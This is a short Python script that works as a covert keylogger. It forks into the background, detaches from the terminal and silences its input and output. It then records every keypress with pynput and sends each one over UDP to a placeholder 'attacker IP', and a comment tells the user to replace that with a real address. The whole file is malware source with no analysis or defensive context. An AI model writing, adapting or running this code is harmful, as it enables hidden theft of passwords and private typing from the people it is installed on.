from pynput import keyboard 
import os, sys, time, socket

sys.stdout.flush()
if os.fork():
    sys.exit()

os.setsid()
with open(os.devnull, 'wb', 0) as ff:
    os.dup2(ff.fileno(), sys.stdin.fileno())
    os.dup2(ff.fileno(), sys.stdout.fileno())

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    client.connect(('attacker IP', 997)) # Replace 'attacker IP' with the actual IP address and port number
except Exception as e:
    print(f"Error connecting to server: {e}")

def log_key(key):
    if hasattr(key, 'char'):
        pressed_key = f"key : {key.char}\n"
        client.sendall(pressed_key.encode())
    else:
        pressed_key = f"special key : {key}\n"
        client.sendall(pressed_key.encode())

listener = keyboard.Listener(on_press=log_key)
listener.start()
while True:
    time.sleep(1)